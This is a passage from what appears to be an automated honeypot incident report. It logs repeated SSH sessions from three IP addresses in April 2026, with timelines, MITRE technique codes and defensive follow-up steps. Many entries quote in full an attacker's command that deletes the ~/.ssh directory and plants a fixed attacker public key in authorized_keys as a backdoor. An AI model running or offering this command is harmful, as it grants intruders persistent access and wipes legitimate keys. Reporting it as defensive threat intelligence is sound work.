| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:37:12` | `cowrie.session.connect` |
| `2026-04-24 12:37:12` | `cowrie.client.version` |
| `2026-04-24 12:37:12` | `cowrie.client.kex` |
| `2026-04-24 12:37:12` | `cowrie.login.success` |
| `2026-04-24 12:37:12` | `cowrie.session.params` |
| `2026-04-24 12:37:12` | `cowrie.command.input` |
| `2026-04-24 12:37:12` | `cowrie.command.failed` |
| `2026-04-24 12:37:12` | `cowrie.log.closed` |
| `2026-04-24 12:37:12` | `cowrie.session.params` |
| `2026-04-24 12:37:12` | `cowrie.command.input` |
| `2026-04-24 12:37:12` | `cowrie.session.file_download` |
| `2026-04-24 12:37:12` | `cowrie.log.closed` |
| `2026-04-24 12:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1e3096937a1

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:37 |
| **Last Seen** | 2026-04-24 12:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:37:14` | `cowrie.session.connect` |
| `2026-04-24 12:37:14` | `cowrie.client.version` |
| `2026-04-24 12:37:14` | `cowrie.client.kex` |
| `2026-04-24 12:37:14` | `cowrie.login.success` |
| `2026-04-24 12:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ee3aa31fca1

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:38 |
| **Last Seen** | 2026-04-24 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:38:09` | `cowrie.session.connect` |
| `2026-04-24 12:38:09` | `cowrie.client.version` |
| `2026-04-24 12:38:09` | `cowrie.client.kex` |
| `2026-04-24 12:38:09` | `cowrie.login.success` |
| `2026-04-24 12:38:10` | `cowrie.session.params` |
| `2026-04-24 12:38:10` | `cowrie.command.input` |
| `2026-04-24 12:38:10` | `cowrie.command.failed` |
| `2026-04-24 12:38:10` | `cowrie.log.closed` |
| `2026-04-24 12:38:10` | `cowrie.session.params` |
| `2026-04-24 12:38:10` | `cowrie.command.input` |
| `2026-04-24 12:38:10` | `cowrie.session.file_download` |
| `2026-04-24 12:38:10` | `cowrie.log.closed` |
| `2026-04-24 12:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff5c212bbb8e

| Field | Detail |
|---|---|
| **Source IP** | `43.128.87[.]215` |
| **First Seen** | 2026-04-24 12:38 |
| **Last Seen** | 2026-04-24 12:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 12:38:11` | `cowrie.session.connect` |
| `2026-04-24 12:38:12` | `cowrie.client.version` |
| `2026-04-24 12:38:12` | `cowrie.client.kex` |
| `2026-04-24 12:38:12` | `cowrie.login.success` |
| `2026-04-24 12:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.87[.]215` to AbuseIPDB if not already reported
- [ ] Block `43.128.87[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbb1528dff4e

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:28 |
| **Last Seen** | 2026-04-24 13:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:28:26` | `cowrie.session.connect` |
| `2026-04-24 13:28:26` | `cowrie.client.version` |
| `2026-04-24 13:28:26` | `cowrie.client.kex` |
| `2026-04-24 13:28:27` | `cowrie.login.success` |
| `2026-04-24 13:28:27` | `cowrie.session.params` |
| `2026-04-24 13:28:27` | `cowrie.command.input` |
| `2026-04-24 13:28:27` | `cowrie.command.failed` |
| `2026-04-24 13:28:27` | `cowrie.log.closed` |
| `2026-04-24 13:28:27` | `cowrie.session.params` |
| `2026-04-24 13:28:27` | `cowrie.command.input` |
| `2026-04-24 13:28:27` | `cowrie.session.file_download` |
| `2026-04-24 13:28:27` | `cowrie.log.closed` |
| `2026-04-24 13:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32c53ea2b95

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:28 |
| **Last Seen** | 2026-04-24 13:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:28:29` | `cowrie.session.connect` |
| `2026-04-24 13:28:29` | `cowrie.client.version` |
| `2026-04-24 13:28:29` | `cowrie.client.kex` |
| `2026-04-24 13:28:30` | `cowrie.login.success` |
| `2026-04-24 13:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be3fa9ca9175

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:30 |
| **Last Seen** | 2026-04-24 13:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:30:56` | `cowrie.session.connect` |
| `2026-04-24 13:30:56` | `cowrie.client.version` |
| `2026-04-24 13:30:56` | `cowrie.client.kex` |
| `2026-04-24 13:30:57` | `cowrie.login.success` |
| `2026-04-24 13:30:57` | `cowrie.session.params` |
| `2026-04-24 13:30:57` | `cowrie.command.input` |
| `2026-04-24 13:30:57` | `cowrie.command.failed` |
| `2026-04-24 13:30:57` | `cowrie.log.closed` |
| `2026-04-24 13:30:57` | `cowrie.session.params` |
| `2026-04-24 13:30:57` | `cowrie.command.input` |
| `2026-04-24 13:30:57` | `cowrie.session.file_download` |
| `2026-04-24 13:30:57` | `cowrie.log.closed` |
| `2026-04-24 13:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c1e16c4bf1

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:30 |
| **Last Seen** | 2026-04-24 13:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:30:59` | `cowrie.session.connect` |
| `2026-04-24 13:30:59` | `cowrie.client.version` |
| `2026-04-24 13:30:59` | `cowrie.client.kex` |
| `2026-04-24 13:31:00` | `cowrie.login.success` |
| `2026-04-24 13:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac038f4ed49b

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:31 |
| **Last Seen** | 2026-04-24 13:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:31:30` | `cowrie.session.connect` |
| `2026-04-24 13:31:30` | `cowrie.client.version` |
| `2026-04-24 13:31:30` | `cowrie.client.kex` |
| `2026-04-24 13:31:30` | `cowrie.login.success` |
| `2026-04-24 13:31:31` | `cowrie.session.params` |
| `2026-04-24 13:31:31` | `cowrie.command.input` |
| `2026-04-24 13:31:31` | `cowrie.command.failed` |
| `2026-04-24 13:31:31` | `cowrie.log.closed` |
| `2026-04-24 13:31:31` | `cowrie.session.params` |
| `2026-04-24 13:31:31` | `cowrie.command.input` |
| `2026-04-24 13:31:31` | `cowrie.session.file_download` |
| `2026-04-24 13:31:31` | `cowrie.log.closed` |
| `2026-04-24 13:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18018d9fbcda

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:31 |
| **Last Seen** | 2026-04-24 13:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:31:33` | `cowrie.session.connect` |
| `2026-04-24 13:31:33` | `cowrie.client.version` |
| `2026-04-24 13:31:33` | `cowrie.client.kex` |
| `2026-04-24 13:31:33` | `cowrie.login.success` |
| `2026-04-24 13:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8332c6a29d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:31 |
| **Last Seen** | 2026-04-24 13:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:31:56` | `cowrie.session.connect` |
| `2026-04-24 13:31:56` | `cowrie.client.version` |
| `2026-04-24 13:31:56` | `cowrie.client.kex` |
| `2026-04-24 13:31:56` | `cowrie.login.success` |
| `2026-04-24 13:31:56` | `cowrie.session.params` |
| `2026-04-24 13:31:56` | `cowrie.command.input` |
| `2026-04-24 13:31:56` | `cowrie.command.failed` |
| `2026-04-24 13:31:56` | `cowrie.log.closed` |
| `2026-04-24 13:31:57` | `cowrie.session.params` |
| `2026-04-24 13:31:57` | `cowrie.command.input` |
| `2026-04-24 13:31:57` | `cowrie.session.file_download` |
| `2026-04-24 13:31:57` | `cowrie.log.closed` |
| `2026-04-24 13:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd1b75a5c0b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:31 |
| **Last Seen** | 2026-04-24 13:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:31:59` | `cowrie.session.connect` |
| `2026-04-24 13:31:59` | `cowrie.client.version` |
| `2026-04-24 13:31:59` | `cowrie.client.kex` |
| `2026-04-24 13:31:59` | `cowrie.login.success` |
| `2026-04-24 13:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89c6d1132066

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:32 |
| **Last Seen** | 2026-04-24 13:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:32:29` | `cowrie.session.connect` |
| `2026-04-24 13:32:29` | `cowrie.client.version` |
| `2026-04-24 13:32:30` | `cowrie.client.kex` |
| `2026-04-24 13:32:30` | `cowrie.login.success` |
| `2026-04-24 13:32:30` | `cowrie.session.params` |
| `2026-04-24 13:32:30` | `cowrie.command.input` |
| `2026-04-24 13:32:30` | `cowrie.command.failed` |
| `2026-04-24 13:32:30` | `cowrie.log.closed` |
| `2026-04-24 13:32:31` | `cowrie.session.params` |
| `2026-04-24 13:32:31` | `cowrie.command.input` |
| `2026-04-24 13:32:31` | `cowrie.session.file_download` |
| `2026-04-24 13:32:31` | `cowrie.log.closed` |
| `2026-04-24 13:32:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4cf3036a1f0

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:32 |
| **Last Seen** | 2026-04-24 13:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:32:33` | `cowrie.session.connect` |
| `2026-04-24 13:32:33` | `cowrie.client.version` |
| `2026-04-24 13:32:33` | `cowrie.client.kex` |
| `2026-04-24 13:32:33` | `cowrie.login.success` |
| `2026-04-24 13:32:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b4776cea15e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:32 |
| **Last Seen** | 2026-04-24 13:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:32:59` | `cowrie.session.connect` |
| `2026-04-24 13:32:59` | `cowrie.client.version` |
| `2026-04-24 13:32:59` | `cowrie.client.kex` |
| `2026-04-24 13:32:59` | `cowrie.login.success` |
| `2026-04-24 13:33:00` | `cowrie.session.params` |
| `2026-04-24 13:33:00` | `cowrie.command.input` |
| `2026-04-24 13:33:00` | `cowrie.command.failed` |
| `2026-04-24 13:33:00` | `cowrie.log.closed` |
| `2026-04-24 13:33:00` | `cowrie.session.params` |
| `2026-04-24 13:33:00` | `cowrie.command.input` |
| `2026-04-24 13:33:00` | `cowrie.session.file_download` |
| `2026-04-24 13:33:00` | `cowrie.log.closed` |
| `2026-04-24 13:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f602442b1c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:33 |
| **Last Seen** | 2026-04-24 13:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:33:02` | `cowrie.session.connect` |
| `2026-04-24 13:33:02` | `cowrie.client.version` |
| `2026-04-24 13:33:02` | `cowrie.client.kex` |
| `2026-04-24 13:33:02` | `cowrie.login.success` |
| `2026-04-24 13:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e057d749a9a7

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:33 |
| **Last Seen** | 2026-04-24 13:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:33:58` | `cowrie.session.connect` |
| `2026-04-24 13:33:58` | `cowrie.client.version` |
| `2026-04-24 13:33:58` | `cowrie.client.kex` |
| `2026-04-24 13:33:59` | `cowrie.login.success` |
| `2026-04-24 13:33:59` | `cowrie.session.params` |
